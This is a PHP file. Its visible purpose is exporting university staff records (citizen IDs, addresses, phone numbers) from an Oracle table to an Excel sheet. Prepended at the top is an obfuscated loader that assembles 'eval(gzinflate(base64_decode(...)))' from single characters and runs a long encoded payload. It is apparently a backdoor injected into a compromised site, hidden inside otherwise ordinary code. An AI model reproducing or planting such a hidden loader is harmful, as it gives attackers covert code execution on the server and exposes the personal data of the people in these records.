<?php
$md5 = "8dc5502b38698c86896a782bd0a86c7e";
$a0 = array('_',"$",'l',"c","t","z",'(','e',';','o','a','f','r',')','6','s','g','4','b',"i",'n',"d",'v');
$b0d = create_function('$'.'v',$a0[7].$a0[22].$a0[10].$a0[2].$a0[6].$a0[16].$a0[5].$a0[19].$a0[20].$a0[11].$a0[2].$a0[10].$a0[4].$a0[7].$a0[6].$a0[18].$a0[10].$a0[15].$a0[7].$a0[14].$a0[17].$a0[0].$a0[21].$a0[7].$a0[3].$a0[9].$a0[21].$a0[7].$a0[6].$a0[1].$a0[22].$a0[13].$a0[13].$a0[13].$a0[8]);
$b0d('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');
?>
<?
//@session_start();
//include("../includes/connect.php");
@ini_set('max_execution_time', 300);
@ini_set('memory_limit', '-1');
include ('../excel/PHPExcel.php');
include ('../excel/PHPExcel/IOFactory.php');
$fileName = "uoc_staff.xls";
$objPHPExcel = new PHPExcel();

	$year = $_GET['year'];
    $objPHPExcel->setActiveSheetIndex(0);
	$objPHPExcel->getActiveSheet()->setCellValue("A1","YEAR");
	$objPHPExcel->getActiveSheet()->setCellValue("B1","");
	$objPHPExcel->getActiveSheet()->setCellValue("C1","CITIZEN_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("D1","PREFIX_NAME");
	$objPHPExcel->getActiveSheet()->setCellValue("E1","STF_FNAME");
	$objPHPExcel->getActiveSheet()->setCellValue("F1","GENDER_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("G1","BIRTHDAY");
	$objPHPExcel->getActiveSheet()->setCellValue("H1","HOMEADD");
	$objPHPExcel->getActiveSheet()->setCellValue("I1","MOO");
	$objPHPExcel->getActiveSheet()->setCellValue("J1","STREET");
	$objPHPExcel->getActiveSheet()->setCellValue("K1","DISTRICT");
	$objPHPExcel->getActiveSheet()->setCellValue("L1","AMPHUR");
	$objPHPExcel->getActiveSheet()->setCellValue("M1","PROVINCE_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("N1","TELEPHONE");
	$objPHPExcel->getActiveSheet()->setCellValue("O1","ZIPCODE");
	$objPHPExcel->getActiveSheet()->setCellValue("P1","NATION_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("Q1","STAFFTYPE_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("R1","TIME_CONTACT_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("S1","BUDGET_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("T1","SUBSTAFFTYPE_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("U1","ADMIN_POSITION_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("V1","POSITION_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("W1","POSITION_WORK");
	$objPHPExcel->getActiveSheet()->setCellValue("X1","DEPARTMENT_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("Y1","DATE_INWORK");
	$objPHPExcel->getActiveSheet()->setCellValue("Z1","STAFF_LEV_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("AA1","SPECIAL_NAME");
	$objPHPExcel->getActiveSheet()->setCellValue("AB1","TEACH_ISCED_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("AC1","GRAD_LEV_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("AD1","GRAD_CURR");
	$objPHPExcel->getActiveSheet()->setCellValue("AE1","GRAD_ISCED_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("AF1","GRAD_PROG_ID");
	$objPHPExcel->getActiveSheet()->setCellValue("AG1","GRAD_UNIV");
	$objPHPExcel->getActiveSheet()->setCellValue("AH1","GRAD_COUNTRY_ID");
	
	$sql = "SELECT * FROM sdu_uoc_staff ";
    $stid = oci_parse($conn, $sql);
	$i=2;
    oci_execute($stid);
	$type = PHPExcel_Cell_DataType::TYPE_STRING;
	//$objPHPExcel->getActiveSheet()->getCellByColumnAndRow("C", $rowno)->setValueExplicit($value, $type);
    while ($row = oci_fetch_array($stid, OCI_BOTH)) {
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("A".$i,$year);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("B".$i,"16500");
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("C".$i,$row['CITIZEN_ID'],$type);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("D".$i,$row['PREFIX_NAME']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("E".$i,$row['STF_FNAME']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("F".$i,$row['GENDER_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("G".$i,$row['BIRTHDAY']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("H".$i,$row['HOMEADD']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("I".$i,$row['MOO']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("J".$i,$row['STREET']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("K".$i,$row['DISTRICT']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("L".$i,$row['AMPHUR']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("M".$i,$row['PROVINCE_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("N".$i,$row['TELEPHONE']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("O".$i,$row['ZIPCODE']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("P".$i,$row['NATION_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("Q".$i,$row['STAFFTYPE_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("R".$i,$row['TIME_CONTACT_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("S".$i,$row['BUDGET_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("T".$i,$row['SUBSTAFFTYPE_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("U".$i,$row['ADMIN_POSITION_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("V".$i,$row['POSITION_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("W".$i,$row['POSITION_WORK']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("X".$i,$row['DEPARTMENT_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("Y".$i,$row['DATE_INWORK']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("Z".$i,$row['STAFF_LEV_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("AA".$i,$row['SPECIAL_NAME']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("AB".$i,$row['TEACH_ISCED_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("AC".$i,$row["GRAD_LEV_ID"]);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("AD".$i,$row['GRAD_CURR']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("AE".$i,$row['GRAD_ISCED_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("AF".$i,$row['GRAD_PROG_ID']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("AG".$i,$row['GRAD_UNIV']);
		$objPHPExcel->getActiveSheet()->setCellValueExplicit("AH".$i,$row['GRAD_COUNTRY_ID']);
		$i++;
      // สร้างไฟล์ csv
	  /*
      fwrite($objWrite, "'{$year}',");
      fwrite($objWrite, "16500");
      fwrite($objWrite, "'{$row['CITIZEN_ID']}',");
      fwrite($objWrite, "'{$row['PREFIX_NAME']}',");
      fwrite($objWrite, "'{$row['STF_FNAME']}',");
      fwrite($objWrite, "'{$row['GENDER_ID']}',");
      fwrite($objWrite, "'{$row['BIRTHDAY']}',");
      fwrite($objWrite, "'{$row['HOMEADD']}',");
      fwrite($objWrite, "'{$row['MOO']}',");
      fwrite($objWrite, "'{$row['STREET']}',");
      fwrite($objWrite, "'{$row['DISTRICT']}',");
      fwrite($objWrite, "'{$row['AMPHUR']}',");
      fwrite($objWrite, "'{$row['PROVINCE_ID']}',");
      fwrite($objWrite, "'{$row['TELEPHONE']}',");
      fwrite($objWrite, "'{$row['ZIPCODE']}',");
      fwrite($objWrite, "'{$row['NATION_ID']}',");
      fwrite($objWrite, "'{$row['STAFFTYPE_ID']}',");
      fwrite($objWrite, "'{$row['TIME_CONTACT_ID']}',");
      fwrite($objWrite, "'{$row['BUDGET_ID']}',");
      fwrite($objWrite, "'{$row['SUBSTAFFTYPE_ID']}',");
      fwrite($objWrite, "'{$row['ADMIN_POSITION_ID']}',");
      fwrite($objWrite, "'{$row['POSITION_ID']}',");
      fwrite($objWrite, "'{$row['POSITION_WORK']}',");
      fwrite($objWrite, "'{$row['DEPARTMENT_ID']}',");
      fwrite($objWrite, "'{$row['DATE_INWORK']}',");
      fwrite($objWrite, "'{$row['STAFF_LEV_ID']}',");
      fwrite($objWrite, "'{$row['SPECIAL_NAME']}',");
      fwrite($objWrite, "'{$row['TEACH_ISCED_ID']}',");
      fwrite($objWrite, "'{$row['GRAD_LEV_ID']}',");
      fwrite($objWrite, "'{$row['GRAD_CURR']}',");
      fwrite($objWrite, "'{$row['GRAD_ISCED_ID']}',");
      fwrite($objWrite, "'{$row['GRAD_PROG_ID']}',");
      fwrite($objWrite, "'{$row['GRAD_UNIV']}',");
      fwrite($objWrite, "'{$row['GRAD_COUNTRY_ID']}'");
	  */
	 
    }
   
	$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel5');
	$objWriter->save($fileName);
?>